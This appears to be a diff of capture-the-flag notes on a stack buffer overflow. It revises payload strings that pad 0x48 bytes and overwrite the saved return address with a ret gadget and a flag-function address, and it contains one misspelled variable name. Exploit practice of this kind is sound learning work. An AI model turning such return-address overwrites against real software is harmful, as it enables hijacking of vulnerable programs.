@@ -9,7 +9,11 @@ v
 rbp->	rbp
 		rip
 
-flag_addrs = 0x0000000000400767
 
-payload = 'A' * 48 + '\x67\x07\x40\x00\x00\x00\x00\x00'
+payload = 'A' * 0x48 + '\x67\x07\x40\x00\x00\x00\x00\x00'
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
+
+flag_addr = 0x0000000000400767
+ret_addr = 0x00000000004007e7
+
+pyaload = 'A' * 0x48 + '\xe7\x07\x40\x00\x00\x00\x00\x00' + '\x67\x07\x40\x00\x00\x00\x00\x00'
